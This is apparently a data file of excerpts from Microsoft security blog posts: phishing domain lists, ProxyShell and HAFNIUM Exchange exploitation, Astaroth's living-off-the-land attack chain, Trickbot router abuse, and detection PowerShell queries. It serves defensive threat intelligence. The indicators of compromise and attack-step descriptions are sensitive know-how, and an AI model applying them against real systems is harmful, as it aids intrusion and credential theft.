bas9oiw88remnisn-25[.]com romanseyilefreaserty0824r-2[.]com sux71a37-net26[.]com sux71a37-net10[.]com maills-activitymove02[.]com maills-activitymove04[.]com maills-activitymove01[.]com copris7-yearts-6[.]com copris7-yearts-5[.]com copris7-yearts-8[.]com securityaccount102[.]com copris7-yearts-4[.]com copris7-yearts-7[.]com copris7-yearts-38[.]com romanseyilefreaserty0824r-6[.]com rick845ko-3[.]com rick845ko-10[.]com fasttuamz587-4[.]com winb2as-wwersd76-4[.]com winb2as-wwersd76-6[.]com winb2as-wwersd76-18[.]com winb2as-wwersd76-1[.]com org77supp-minty662-9[.]com winb2as-wwersd76-12[.]com account-info003[.]com account-info012[.]com laser9078-ter17[.]com account-info011[.]com notoficationdeliveryamazon1[.]com notoficationdeliveryamazon20[.]com notoficationdeliveryamazon17[.]com notoficationdeliveryamazon12[.]com c notoficationdeliveryamazon6[.]com notoficationdeliveryamazon5[.]com \nDomain Domain notoficationdeliveryamazon18[.]com notoficationdeliveryamazon13[.]com notoficationdeliveryamazon14[.]com gaplerr-xt5[.]com kenatipurecehkali-xt3[.]com kenatipurecehkali-xt13[.]com kenatipurecehkali-xt12[.]com kenatipurecehkali-xt5[.]com kenatipurecehkali-xt6[.]com hayalanphezor-2sit[.]com noticesumartyas-sc24[.]com noticesumartyas-sc13[.]com noticesumartyas-sc17[.]com noticesumartyas-sc22[.]com noticesumartyas-sc4[.]com noticesumartyas-sc21[.]com appgetbox3[.]com notoficationdeliveryamazon19[.]com appgetbox9[.]com appgetbox8[.]com notoficationdeliveryamazon2[.]com appgetbox7[.]com notoficationdeliveryamazon23[.]com appgetbox10[.]com hvgjgj-shoes08[.]com hvgjgj-shoes13[.]com hvgjgj-shoes15[.]com hvgjgj-shoes16[.]com hvgjgj-shoes20[.]com hvgjgj-shoes12[.]com hvgjgj-shoes10[.]com jgkxjhx-shoes03[.]com hvgjgj-shoes14[.]com jgkxjhx-shoes05[.]com hvgjgj-shoes19[.]com jgkxjhx-shoes08[.]com romanseyilefreaserty0824r-7[.]com gets25-amz[.]net gets27-amz[.]net gets28-amz[.]net \nDomain Domain gets32-amz[.]net gets3-amz[.]net noticesumartyas-sc19[.]com noticesumartyas-sc23[.]com noticesumartyas-sc15[.]com noticesumartyas-sc20[.]com noticesumartyas-sc29[.]com rick845ko-1[.]com rick845ko-5[.]com bas9oiw88remnisn-21[.]com bas9oiw88remnisn-19[.]com rick845ko-6[.]com bas9oiw88remnisn-17[.]com bas9oiw88remnisn-16[.]com account-info008[.]com suppamz2-piryshj01-3[.]com securemanageprodio-02[.]com securemanageprodio-05[.]com dak12shub-3[.]com dak12shub-9[.]com dak12shub-6[.]com dak12shub-10[.]com securemanageprodio-03[.]com org77supp-minty662-7[.]com org77supp-minty662-10[.]com bimspelitskalix-xuer2[.]com gets35-amz[.]net service-account-7254[.]com service-account-7247[.]com account-info004[.]com bas9oiw88remnisn-14[.]com solution23-servviue-23[.]com romanseyilefreaserty0824r-4[.]com hayalanphezor-7sit[.]com securemanageprodio-04[.]com solution23-servviue-15[.]com suppamz2-piryshj01-9[.]com suppamz2-piryshj01-6[.]com solution23-servviue-7[.]com solution23-servviue-16[.]com S \nDomain Domain solution23-servviue-27[.]com romanseyilefreaserty0824r-5[.]com solution23-servviue-9[.]com solution23-servviue-19[.]com solution23-servviue-17[.]com solution23-servviue-18[.]com solution23-servviue-30[.]com solution23-servviue-13[.]com solution23-servviue-10[.]com solution23-servviue-4[.]com solution23-servviue-24[.]com solution23-servviue-5[.]com service-account-7243[.]com service-account-735424[.]com service-account-374567[.]com service-account-764246[.]com gxnhfghnjzh809[.]com xcfhjxfyxnhnjzh10[.]com accountservicealert003[.]com care887-yyrtconsumer23-24[.]com care887-yyrtconsumer23-23[.]com care887-yyrtconsumer23-27[.]com care887-yyrtconsumer23-26[.]com laser9078-ter11[.]com laser9078-ter10[.]com hayalanphezor-6sit[.]com hayalanphezor-3sit[.]com romanseyilefreaserty0824r-3[.]com ressstauww-6279-3[.]com ressstauww-6279-10[.]com ressstauww-6279-7[.]com ressstauww-6279-1[.]com ketiak-muser14[.]com ketiak-muser13[.]com spammer-comingson01[.]com spammer-comingson02[.]com spammer-comingson05[.]com spammer-comingson07[.]com posidma-posidjar03[.]com posidma-posidjar05[.]com \nWidespread credential phishing campaign abuses open redirector links | Microsoft Security Blog \nDomain Domain tembuslah-bandar01[.]com tembuslah-bandar02[.]com tembuslah-bandar04[.]com tembuslah-bandar05[.]com tembuslah-bandar07[.]com tembuslah-bandar08[.]com tembuslah-bandar10[.]com ", "source": "microsoft"}, {"title": "Introduction", "content": "To deliver effective post-breach detection\\*, Windows Defender ATP uses endpoint sensors that are built into Windows 10. A notable difference between these sensors and first-gen endpoint sensors is the absence of signatures. Instead of relying on signatures, Windows Defender ATP sensors collect a generic stream of behavioral events. For example, the sensors can capture whenever a process connects to a web server and starts to drop and launch an application. \n\\*As disclosed in June, the upcoming Fall Creators Update will integrate Windows Defender ATP closely with the rest of the Windows threat protection stack, transforming it into a comprehensive pre- and post-breach protection solution that enables enterprise customers to not only detect and respond to threats on their devices and networks but also to deliver proactive protection. \nWe marry data from these sensors with the Microsoft Intelligent Security Graph to trigger detections in Windows Defender ATP. For instance, in the example above, we can augment sensor data with a variety of information about the web server, including IP address reputation as well as Windows Defender SmartScreen reputation for the sites hosted on the same server. The graph can expand further to cover file prevalence as well as files with similar network activity and other shared behaviors. By referencing contextual information available through the Intelligent Security Graph, Windows Defender ATP can deliver more reliable verdicts. \nThe detections we build on top of our sensors and graph data can range from simple pinpoint detections that identify specific malicious behavior to more complex heuristics. For example, we can identify the use of a command-line parameter associated with a particular hacking tool or whenever a browser is downloading and executing a binary from a low-reputation website. And, of course, we use full-fledged machine learning to spot subtler breach activity. ", "source": "microsoft"}, {"title": "Introduction", "content": "The North Korean threat actor that Microsoft tracks as Sapphire Sleet has been conducting cryptocurrency theft as well as computer network exploitation activities since at least 2020. Microsoft's analysis of Sapphire Sleet activity indicates that over 10 million US dollars' worth of cryptocurrency was stolen by the threat actor from multiple companies over a six-month period. ", "source": "microsoft"}, {"title": "Introduction", "content": "By Azure Network Security Team \nAmplification attacks are one of the most common distributed denial of service (DDoS) attack vectors. These attacks are typically categorized as flooding or volumetric attacks, where the attacker succeeds in generating more traffic than the target can process, resulting in exhausting its resources due to the amount of traffic it receives. \nIn this blog, we start by surveying the anatomy and landscape of amplification attacks, while providing statistics from Azure on most common attack vectors, volumes, and distribution. We then describe some of the countermeasures taken in Azure to mitigate amplification attacks. ", "source": "microsoft"}, {"title": "Protection", "content": "Azure's DDoS mitigation platform mitigated the largest ever DDoS attacks in history by employing a globally distributed DDoS protection platform that scales beyond 60Tbps. We ensure our platform and customers' workloads are always protected against DDoS attacks. To enhance our DDoS posture, we continuously collaborate with other industry players to fight reflected amplification attacks. \nAzure customers are protected against Layer 3 and Layer 4 DDoS attacks as part of protecting our infrastructure and cloud platform. However, Azure DDoS Protection Standard provides comprehensive protection for customers by auto-tuning the detection policy to the specific traffic patterns of the protected application. This ensures that whenever there are changes in traffic patterns, such as in the case of flash crowd event, the DDoS policy is automatically updated to reflect those changes for optimal protection. When a reflected amplification attack is launched against a protected application, our detection pipeline detects it automatically based on the auto-tuned policy. The mitigation policy, that is automatically set for customers, without their need to manually configure or change it, includes the needed countermeasures to block reflected amplification attacks. \nProtection is\u202fsimple to enable\u202fon any new or existing virtual network and does not require any application or resource changes. Our recently released\u202fAzure built-in policies\u202fallow for better management of network security compliance by providing great ease of onboarding across all your virtual network resources and configuration of logs. \nTo strengthen the security posture of applications, Azure's network security services can work in tandem to secure your workloads, where DDoS protection is one of the tools we provide. Organizations that pursue zero trust architecture can benefit from our services to achieve better protection. ", "source": "microsoft"}, {"title": "Protection", "content": "Azure DDoS Protection product page.   \nAzure DDoS Protection Standard\u202fdocumentation.   \nAzure DDoS Protection Standard\u202freference architectures.   \nDDoS Protection\u202fbest practices.   \nAzure DDoS\u202fRapid Response.   \nProtect your\u202fon-premises resources. \nAmir Dahan and Syed Pasha Azure Networking Team ", "source": "microsoft"}, {"title": "Introduction", "content": "To obtain initial access into the victim's environment, the threat actor was observed exploiting the ProxyShell vulnerabilities CVE-2021-34473, CVE-2021-34523, and CVE-2021-31207 on unpatched Microsoft Exchange Servers. The exploitation of these vulnerabilities allowed the threat actor to: \nAttain system-level privileges on the compromised Exchange host   \nEnumerate LegacyDN of users by sending Autodiscover requests, including SIDs of users   \nConstruct a valid authentication token and use it against the Exchange PowerShell backend   \nImpersonate domain admin users and create a web shell by using the NewMailboxExportRequest cmdlet   \nCreate web shells to obtain remote control on affected servers \nThe threat actor was observed operating from the following IP to exploit ProxyShell and access the web shell: \n185.225.73[.]244 ", "source": "microsoft"}, {"title": "Introduction", "content": "Microsoft Threat Intelligence identified a shift in tactics by Silk Typhoon, a Chinese espionage group, now targeting common IT solutions like remote management tools and cloud applications to gain initial access. While they haven't been observed directly targeting Microsoft cloud services, they do exploit unpatched applications that allow them to elevate their access in targeted organizations and conduct further malicious activities. After successfully compromising a victim, Silk Typhoon uses the stolen keys and credentials to infiltrate customer networks where they can then abuse a variety of deployed applications, including Microsoft services and others, to achieve their espionage objectives. Our latest blog explains how Microsoft security solutions detect these threats and offers mitigation guidance, aiming to raise awareness and strengthen defenses against Silk Typhoon's activities. \nSilk Typhoon is an espionage-focused Chinese state actor whose activities indicate that they are a well-resourced and technically efficient group with the ability to quickly operationalize exploits for discovered zero-day vulnerabilities in edge devices. This threat actor holds one of the largest targeting footprints among Chinese threat actors. Part of this is due to their opportunistic nature of acting on discoveries from vulnerability scanning operations, moving quickly to the exploitation phase once they discover a vulnerable public-facing device that they could exploit. \nAs a result, Silk Typhoon has been observed targeting a wide range of sectors and geographic regions, including but not limited to information technology (IT) services and infrastructure, remote monitoring and management (RMM) companies, managed service providers (MSPs) and affiliates, healthcare, legal services, higher education, defense,  government, non-governmental organizations (NGOs), energy, and others located in the United States and throughout the world. \nSilk Typhoon has shown proficiency in understanding how cloud environments are deployed and configured, allowing them to successfully move laterally, maintain persistence, and exfiltrate data quickly within victim environments. Since Microsoft Threat Intelligence began tracking this threat actor in 2020, Silk Typhoon has used a myriad of web shells that allow them to execute commands, maintain persistence, and exfiltrate data from victim environments. \nAs with any observed nation-state threat actor activity, Microsoft has directly notified targeted or compromised customers, providing them with important information needed to secure their environments. We're publishing this blog to raise awareness of Silk Typhoon's recent and long-standing malicious activities, provide mitigation and hunting guidance, and help disrupt operations by this threat actor. ", "source": "microsoft"}, {"title": "Introduction", "content": "The purpose of Trickbot for using MikroTik devices is to create a line of communication between the Trickbot-affected device and the C2 server that standard defense systems in the network are not able to detect. The attackers begin by hacking into a MikroTik router. They do this by acquiring credentials using several methods, which we will discuss in detail in the following section. \nThe attackers then issue a unique command that redirects traffic between two ports in the router, establishing the line of communication between Trickbot-affected devices and the C2. MikroTik devices have unique hardware and software, RouterBOARD and RouterOS. This means that to run such a command, the attackers need expertise in RouterOS SSH shell commands. We uncovered this attacker method by tracking traffic containing these SSH shell commands. ", "source": "microsoft"}, {"title": "defend", "content": "As security solutions for conventional computing devices continue to evolve and improve, attackers will explore alternative ways to compromise target networks. Attack attempts against routers and other IoT devices are not new, and being unmanaged, they can easily be the weakest links in the network. Therefore, organizations should also consider these devices when implementing security policies and best practices. ", "source": "microsoft"}, {"title": "defend", "content": "To harden IoT devices and IT networks against threats like Trickbot, organizations must implement solutions that detect malicious attempts to access devices and raises alerts on anomalous network behavior. Microsoft Defender for IoT provides agentless, network-layer security that lets organizations deploy continuous asset discovery, vulnerability management, and threat detection for IoT, OT devices, and Industrial Control Systems (ICS) on-premises or in Azure-connected environments. It is updated regularly with indicators of compromise (IoCs) from threat research like the one described on this blog, and rules to detect malicious activity. \nMeanwhile, Microsoft 365 Defender protects against attacks related to highly modular, multi-stage malware like Trickbot by coordinating threat data across identities, endpoints, cloud apps, email, and documents. Such cross-domain visibility allows Microsoft 365 Defender to comprehensively detect and remediate Trickbot's end-to-end attack chain-from malicious attachments and links it sends via emails to its follow-on activities in endpoints. Its rich set of tools like advanced hunting also lets defenders surface threats and gain insights for hardening networks from compromise. \nUncovering Trickbot's use of IoT devices in command-and-control infrastructure | Microsoft Security Blog In addition, working with the Microsoft Defender for IoT Research Team, RiskIQ identified compromised MikroTik routers acting as communication channels for Trickbot C2 and created detection logic to flag devices under threat actor control. See RiskIQ's article. \nTo learn more about securing your IoT and OT devices, explore Microsoft Defender for IoT. \nDavid Atch, Section 52 at Microsoft Defender for IoT Noa Frumovich, Section 52 at Microsoft Defender for IoT Ross Bevington, Microsoft Threat Intelligence Center (MSTIC) ", "source": "microsoft"}, {"title": "Introduction", "content": "Malvertising has been one of the most prevalent techniques in Node.js attacks we've observed in customer environments. Attackers use malvertising campaigns to lure targets to fraudulent websites, where the targets then unknowingly download a malicious installer disguised as legitimate software. These fake websites often take advantage of popular themes such as financial services, software updates, and trending applications. \nIn this campaign, the downloaded installer contains a malicious DLL that gathers system information and sets up a scheduled task for persistence. This sets the stage for its other techniques and activities, such as defense evasion, data collection, and payload delivery and execution. ", "source": "microsoft"}, {"title": "Defense", "content": "The created scheduled task runs PowerShell commands designed to exclude both the PowerShell process and the current directory from being scanned by Microsoft Defender for Endpoint. This action prevents subsequent PowerShell executions from being flagged, allowing the attack to continue undisturbed. ", "source": "microsoft"}, {"title": "Introduction", "content": "Join us for core Black Hat sessions, submitted for consideration by Microsoft subject matter experts and selected by the Black Hat content committee to be included in its main agenda. \nWednesday, Hacking   \nAugust 7, generative AI   \n2024, 12:40 with PyRIT   \nPM PT-1:50   \nPM PT Understand the   \npresence of   \nsecurity and safety risks within   \ngenerative AI   \nsystems with   \nPyRIT.   \nRaja Sekhar Rao   \nDheekonda,   \nSenior Software   \nEngineer,   \nMicrosoft \nWednesday, August 7, 2024, 3:20 PM PT \nAI Safety and   \nYou: Perspectives   \non Evolving   \nRisks and   \nImpacts Panel on the nuts and bolts of AI   \nSafety and   \noperationalizing it in practice. Dr. Amanda   \nMinnich, Senior Researcher,   \nMicrosoft;   \nNathan Hamiel, Senior Director of Research,   \nKudelski   \nSecurity;   \nRumman   \nChowdhury;   \nMikel   \nRodriguez,   \nResearch   \nScientist,   \nGoogle   \nDeepmind \nWednesday, Predict, August Prioritize, Patch: 7, 2024, 1:30 How Microsoft PM PT-2:10 Harnesses LLMs PM PT for Security Response \nA crash course into Bill Demirkapi, leveraging Large Security Language Models Engineer, (LLMs) to reduce Microsoft the impact of Security tedious security Response response Center workflows. \nWednesday, Compromising August 7, Confidential 2024, 3:20 Compute, One PM PT-4:00 Bug at a Time PM PT \nReview of methodology and the emulation tooling developed for security testing purposes, and how it influenced our understanding and review strategy. \nBen Hania,   \nSenior Security Researcher,   \nMicrosoft;   \nMaxime Villard, Security   \nResearcher,   \nMicrosoft; Yair Netzer,   \nPrincipal   \nSecurity   \nResearcher,   \nMicrosoft \nThursday, August 8, 2024, 10:20 AM PT11:00 AM PT \nOVPNX: 4 Zero- Microsoft identified Vladimir   \nDays Leading to vulnerabilities in Tokarev, Senior RCE, LPE and OpenVPN that Security   \nKCE (via BYOVD) attackers could Researcher, Affecting chain and remotely Microsoft Millions of exploit to gain   \nOpenVPN control over   \nEndpoints endpoints.   \nAcross the   \nGlobe ", "source": "microsoft"}, {"title": "Introduction", "content": "HAFNIUM primarily targets entities in the United States across a number of industry sectors, including infectious disease researchers, law firms, higher education institutions, defense contractors, policy think tanks, and NGOs. \nHAFNIUM has previously compromised victims by exploiting vulnerabilities in internet-facing servers, and has used legitimate open-source frameworks, like Covenant, for command and control. Once they've gained access to a victim network, HAFNIUM typically exfiltrates data to file sharing sites like MEGA. \nIn campaigns unrelated to these vulnerabilities, Microsoft has observed HAFNIUM interacting with victim Office 365 tenants. While they are often unsuccessful in compromising customer accounts, this reconnaissance activity helps the adversary identify more details about their targets' environments. \nHAFNIUM operates primarily from leased virtual private servers (VPS) in the United States. ", "source": "microsoft"}, {"title": "Indicators of compromise", "content": "The Exchange Server team has created a script to run a check for HAFNIUM IOCs to address performance and memory concerns. That script is available here: https://github.com/microsoft/CSS-Exchange/tree/main/Security. \nCVE-2021-26855 exploitation can be detected via the following Exchange HttpProxy logs: These logs are located in the following directory: %PROGRAMFILES%\\Microsoft\\Exchange Server\\V15\\Logging\\HttpProxy Exploitation can be identified by searching for log entries where the AuthenticatedUser is empty and the AnchorMailbox contains the pattern of ServerInfo\\~\\*/\\* Here is an example PowerShell command to find these log entries: \nImport-Csv -Path (Get-ChildItem -Recurse -Path \"\\$env:PROGRAMFILES\\Microsoft\\Exchange Server\\V15\\Logging\\HttpProxy\" -Filter '\\*.log').FullName | Where-Object { \\$_.AnchorMailbox -like 'ServerInfo\\~\\*/\\*' -or \\$_.BackEndCookie -like 'Server\\~\\*/\\*\\~\\*'} | select DateTime, AnchorMailbox, UrlStem, RoutingHint, ErrorCode, TargetServerVersion, BackEndCookie, GenericInfo, GenericErrors, UrlHost, Protocol, Method, RoutingType, AuthenticationType, ServerHostName, HttpStatus, BackEndStatus, UserAgent \nIf activity is detected, the logs specific to the application specified in the AnchorMailbox path can be used to help determine what actions were taken. \nThese logs are located in the   \n%PROGRAMFILES%\\Microsoft\\Exchange Server\\V15\\Logging directory. \nCVE-2021-26858 exploitation can be detected via the Exchange log files: C:\\Program Files\\Microsoft\\Exchange Server\\V15\\Logging\\OABGeneratorLog Files should only be downloaded to the %PROGRAMFILES%\\Microsoft\\Exchange \nHAFNIUM targeting Exchange Servers with 0-day exploits | Microsoft Security Blog Server\\V15\\ClientAccess\\OAB\\Temp directory In case of exploitation, files are downloaded to other directories (UNC or local paths) Windows command to search for potential exploitation: \nfindstr /snip /c:\"Download failed and temporary file\" \"%PROGRAMFILES%\\Microsoft\\Exchange Server\\V15\\Logging\\OABGeneratorLog\\\\*.log\" \nCVE-2021-26857 exploitation can be detected via the Windows Application event logs \nExploitation of this deserialization bug will create Application events with the following properties: \nSource: MSExchange Unified Messaging EntryType: Error Event Message Contains: System.InvalidCastException \nFollowing is PowerShell command to query the Application Event Log for these log entries: \nGet-EventLog -LogName Application -Source \"MSExchange Unified Messaging\" -EntryType Error | Where-Object { \\$_.Message -like \"\\*System.InvalidCastException\\*\" } \nCVE-2021-27065 exploitation can be detected via the following Exchange log files: C:\\Program Files\\Microsoft\\Exchange Server\\V15\\Logging\\ECP\\Server All Set-<AppName>VirtualDirectory properties should never contain script. InternalUrl and ExternalUrl should only be valid Uris. \nFollowing is a PowerShell command to search for potential exploitation: \nSelect-String -Path   \n\"\\$env:PROGRAMFILES\\Microsoft\\Exchange   \nServer\\V15\\Logging\\ECP\\Server\\\\*.log\" -Pattern   \n'Set-.+VirtualDirectory' ", "source": "microsoft"}, {"title": "defend", "content": "Please note that some of these detections are generic detections and not unique to this campaign or these exploits. \nExploit:Script/Exmann.A!dha   \nBehavior:Win32/Exmann.A Backdoor:ASP/SecChecker.A Backdoor:JS/Webshell (not unique) Trojan:JS/Chopper!dha (not unique) Behavior:Win32/DumpLsass.A!attk (not unique)   \nBackdoor:HTML/TwoFaceVar.B (not unique) ", "source": "microsoft"}, {"title": "defend", "content": "Microsoft 365 Defender customers can find related hunting queries below or at this GitHub location: https://github.com/microsoft/Microsoft-365-Defender-HuntingQueries/ \nAdditional queries and information are available via Threat Analytics portal for Microsoft Defender customers. ", "source": "microsoft"}, {"title": "Introduction", "content": "As the first step in our process, threat hunters formulate a hypothesis around data related to a potential threat, such as, \"The attacker remotely executed code by exploiting a vulnerability in a system process.\" After validating the soundness of the hypothesis by measuring the signal-to noise ratio and using known data sets to ensure that the accuracy is within acceptable limits, the hypothesis is modeled in our hunting systems, which automatically perform data collection, correlation, and enrichment. \nThese automated systems collect observations through our telemetry, from multiple devices and often from different stages of an attack. Each observation represents a single instance of a hypothesis \u2013 in our example, here's the system process, here's what the system process did, and here are the arguments that were passed to it. Examining the observations associated with the hypothesis helps analysts determine if that instance of the hypothesis is valid. \nObservations are then grouped into potential threats that represent our best current understanding of a collection of observations. If these observations truly reflect malicious behavior, the picture they paint is that of an attack on a customer's computing infrastructure. Looking at data associated with these observations can help us understand which potential threats may wreak the most havoc and prioritize the investigation of more critical threats. ", "source": "microsoft"}, {"title": "defend", "content": "Whenever we discover and validate a critical threat in a Defender Experts for Hunting customer's environment, we immediately send out a Defender Experts Notification. These are special alerts that provide deep context about the threat, with details specific to each customer's unique environment. \nDefender Experts Notifications aim to help SOCs formulate a response before a critical attack can wreak havoc on their network. They help highlight the most critical threats, and clearly identify the ones that need aggressive handling. They also contain key technical details, which can assist SOCs in swiftly handling an ongoing threat. Customers receive a timeline of observed events in their organization, as well as advanced hunting queries for surfacing threat activities. These details can aid in understanding the attack flow and discovering the scope of the threat. ", "source": "microsoft"}, {"title": "Introduction", "content": "PSOAs, which Microsoft also refers to as cyber mercenaries, sell hacking tools or services through a variety of business models, including access as a service. In access as a service, the actor sells full end-to-end hacking tools that can be used by the purchaser in cyber operations. The PSOA itself is not involved in any targeting or running of the operations. \nMicrosoft Threat Intelligence analysts assess with high confidence that DEV-0196 uses this model, selling exploitation services and malware to governments. It's not directly involved in targeting. Microsoft also assesses with high confidence that DEV-0196 is linked to an Israel-based private company called QuaDream. According to the Israeli Corporations Authority, QuaDream, under the Israeli name $\\mathsf{p}^{\\prime\\prime}\\mathsf{y}\\mathsf{2}$ \u05dd\u05d9\u05e8\u05d3\u05d5\u05d5\u05e7, was incorporated in August 2016. The company has no website, and there is little public reporting about the company, with a few notable exceptions. \nQuaDream came to international attention in a 2022 Reuters report, which cited a company brochure that described the REIGN platform and a list of capabilities, the report also notably suggested that QuaDream used a zero-click iOS exploit that leveraged the same vulnerability seen in NSO Group's ForcedEntry exploit. An earlier report by Israeli news outlet Haaretz, also citing a QuaDream brochure, revealed that QuaDream did not sell REIGN directly to customers but instead did so through a Cypriot company. Haaretz also reported that Saudi Arabia's government was among QuaDream's clients, as was the government of Ghana. However, Haaretz could not confirm allegations made in the Ghanian press and repeated in the Israeli press that QuaDream employees were among 14 Israeli tech workers from different companies who travelled to Accra, Ghana in 2020 to meet with the incumbent administration three months prior to the presidential election for the purposes of a special project relating to it. \nQuaDream was mentioned in a December 2022 report from Meta, which reportedly took down 250 accounts associated with the company. According to the report, Meta observed QuaDream testing its ability to exploit iOS and Android mobile devices with the intent \"to exfiltrate various types of data including messages, images, video and audio files, and geolocation.\" ", "source": "microsoft"}, {"title": "Introduction", "content": "As security solutions evolve, bad actors quickly adapt their methodologies to go undetected. Polymorphic attacks designed to evade common protection solutions are becoming increasingly common. Organizations therefore need solutions that focus on zero-day and targeted attacks in addition to known vectors. Purely standards based or known signature and reputation-based checks will not cut it. \nSolutions that include rich detonation capabilities for files and URLs are necessary to catch payload-based attacks. Advanced machine learning models that look at the content and headers of emails as well as sending patterns and communication graphs are important to thwart a wide range of attack vectors including payloadless vectors such as business email compromise. Machine learning capabilities are greatly enhanced when the signal source feeding it is broad and rich; so, solutions that boast of a massive security signal base should be preferred. This also allows the solution to learn and adapt to changing attack strategies quickly which is especially important for a rapidly changing threat landscape. ", "source": "microsoft"}, {"title": "Defense", "content": "Attackers target the weakest link in an organization's defenses. They look for an initial compromise to get in, and once inside will look for a variety of ways increase the scope and impact of the breach. They typically achieve this by trying to compromise other users, moving laterally within the organization, elevating privileges when possible, and the finally reaching a system or data repository of critical value. As they proliferate through the organization, they will touch different endpoints, identities, mailboxes and services. \nReducing the impact of such attacks requires quick detection and response. And that can only be achieved when the defenses across these systems do not act in silos. This is why it is critical to have an integrated view into security solutions. Look for an email security solution that integrates well across other security solutions such as endpoint protection, CASB, identity protection, etc. Look for richness in integration that goes beyond signal integration, but also in terms of detection and response flows. ", "source": "microsoft"}, {"title": "Introduction", "content": "Since February 2022, POLONIUM has been observed primarily targeting organizations in Israel with a focus on critical manufacturing, IT, and Israel's defense industry. In at least one case, POLONIUM's compromise of an IT company was used to target a downstream aviation company and law firm in a supply chain attack that relied on service provider credentials to gain access to the targeted networks. Multiple manufacturing companies they targeted also serve Israel's defense industry, indicating a POLONIUM tactic that follows an increasing trend by many actors, including among several Iranian groups, of targeting service provider access to gain downstream access. Observed victim organizations were in the following sectors: critical manufacturing, information technology, transportation systems, defense industrial base, government agencies and services, food and agriculture, financial services, healthcare and public health, and other business types. ", "source": "microsoft"}, {"title": "Introduction", "content": "By Microsoft Threat Intelligence \nThe technologies that connect us are continually advancing, and while this brings tremendous new capabilities to users, it also opens new attack surfaces for adversaries and abusers. Social engineering represents a class of threats that has extended to virtually every technology that enables human connection. Our recent analysis of a phishing attack connected to the blockchain reaffirms the durability of these threats as well as the need for security fundamentals to be built into related future systems and frameworks. \nCredential phishing haunts our customers day in and day out in the web2 world, which is the version of the internet that most of us are familiar with and use today. It's a profitable business for cybercriminals, even if margins are slim and there's significant risk associated with monetizing credentials to a business (for example, through human-operated ransomware attacks). Now, imagine if an attacker can \u2013 single-handedly \u2013 grab a big chunk of the nearly 2.2 trillion US dollar \ncryptocurrency market capitalization and do so with almost complete anonymity. This changes the dynamics of the game and is exactly what's happening in the web3 world multiple times a month. \nWeb3 is the decentralized world that is built on top of cryptographic security that lays the foundation of the blockchain (in contrast, web2 is the more centralized world). In web3, funds you hold in your non-custodial wallet are secured by the private key that is only known to you. Smart contracts you interact with are immutable, often open-source, and audited. How do phishing attacks happen with such a secure foundation? \nThis is what we will explore in this blog. We will share some necessary background information, and then dive into the Badger DAO attack, a phishing attack that occurred in November-December 2021, during which the attacker was able to steal approximately 121 million US dollars from users. \nThe Badger DAO attack highlights the need to build security into web3 while it is in its early stages of evolution and adoption. At a high level, we recommend that software developers increase security usability of web3. In the meantime, end users need to explicitly verify information through additional resources, such as reviewing the projects documentation and external reputation/informational web sites. ", "source": "microsoft"}, {"title": "Introduction", "content": "I was doing routine review of Windows Defender Antivirus telemetry when I noticed an anomaly from a detection algorithm designed to catch a specific fileless technique. Telemetry showed a sharp increase in the use of the Windows Management Instrumentation Command-line (WMIC) tool to run a script (a technique that MITRE refers to XSL Script Processing), indicating a fileless attack. \nAfter some hunting, I discovered the campaign that aimed to run the Astaroth backdoor directly in memory. Astaroth is a notorious info-stealing malware known for stealing sensitive information like credentials, keystrokes, and other data, which it exfiltrates and sends to a remote attacker. The attacker can then use stolen data to try moving laterally across networks, carry out financial theft, or sell victim information in the cybercriminal underground. \nWhile the behavior may slightly vary in some instances, the attack generally followed these steps: A malicious link in a spear-phishing email leads to an LNK file. When double-clicked, the LNK file causes the execution of the WMIC tool with the \"/Format\" parameter, which allows the download and execution of a JavaScript code. The JavaScript code in turn downloads payloads by abusing the Bitsadmin tool. \nAll the payloads are Base64-encoded and decoded using the Certutil tool. Two of them result in plain DLL files (the others remain encrypted). The Regsvr32 tool is then used to load one of the decoded DLLs, which in turn decrypts and loads other files until the final payload, Astaroth, is injected into the Userinit process. \nIt's interesting to note that at no point during the attack chain is any file run that's not a system tool. This technique is called living off the land: using legitimate tools that are already present on the target system to masquerade as regular activity. \nThe attack chain above shows only the Initial Access and Execution stages. In these stages, the attackers used fileless techniques to attempt to silently install the malware on target devices. Astaroth is a notorious information stealer with many other post-breach capabilities that are not discussed in this blog. Preventing the attack in these stages is critical. \nDespite its use of \"invisible\" techniques, the attack chain runs under the scrutiny of Microsoft Defender ATP. Multiple advanced technologies at the core of Windows Defender Antivirus expose these techniques to spot and stop a wide range of attacks. \nThese protection technologies stop threats at first sight, use the power of the cloud, and leverage Microsoft's industry-leading optics to deliver effective protection. This defense-in-depth is observed in the way these technologies uncovered and blocked the attack at multiple points in Astaroth's complex attack chain. \nFigure 3. Microsoft Defender ATP's Antivirus solutions for fileless techniques used by Astaroth \nFor traditional, file-centric antivirus solutions, the only window of opportunity to detect this attack may be when the two DLLs are decoded after being downloaded -after all, every executable used in the attack is non-malicious. If this were the case, this attack would pose a serious problem: since the DLLs use code obfuscation and are likely to change very rapidly between campaigns, focusing on these DLLs would be a vicious trap. \nHowever, as mentioned, Microsoft Defender ATP's Antivirus catches fileless techniques. Let's break down the attack steps, enumerate the techniques used using MITRE technique ID as reference, and map the relevant Microsoft Defender ATP protection. ", "source": "microsoft"}, {"title": "Protection", "content": "The strength of Microsoft Defender ATP's Antivirus engines in exposing fileless techniques add to the capabilities of the unified endpoint protection platform. Activities related to fileless techniques are reported in Microsoft Defender Security Center as alerts, so security operations teams can further investigate and respond to attacks using endpoint detection and response, advanced hunting, and other capabilities in Microsoft Defender ATP. \nWMIC.exe detected as Behavior:Win32/WmicLoadDll.A by Antivirus ", "source": "microsoft"}, {"title": "Windows Defender Antivirus", "content": "The rest of Microsoft Defender ATP's capabilities beyond Antivirus enable security operations teams to detect and remediate fileless threats and other attacks. Notably, Microsoft Defender ATP endpoint detection and response (EDR) has strong and durable detections for fileless and living-off-the-land techniques across the entire attack chain. \nWe also published a threat analytics report on living-off-the-land binaries to help security operations assess organizational security posture and resilience against these threats. New Microsoft Defender ATP services like threat and vulnerability management and Microsoft Threat Experts (managed threat hunting), further assist organizations in defending against fileless threats. \nThrough signal-sharing and orchestration of threat remediation across Microsoft's security technologies, these protections are further amplified in Microsoft Threat Protection, Microsoft's comprehensive security solution for the modern workplace. For this Astaroth campaign, Office 365 Advanced Threat Protection (Office 365 ATP) detects the emails with malicious links that start the infection chain. \nMicrosoft Threat Protection secures identities, endpoints, email and data, apps, and infrastructure. ", "source": "microsoft"}, {"title": "Introduction", "content": "MSTIC has observed NICKEL actors using exploits against unpatched systems to compromise remote access services and appliances. Upon successful intrusion, they have used credential dumpers or stealers to obtain legitimate credentials, which they used to gain access to victim accounts. NICKEL actors created and deployed custom malware that allowed them to maintain persistence on victim networks over extended periods of time. MSTIC has also observed NICKEL perform 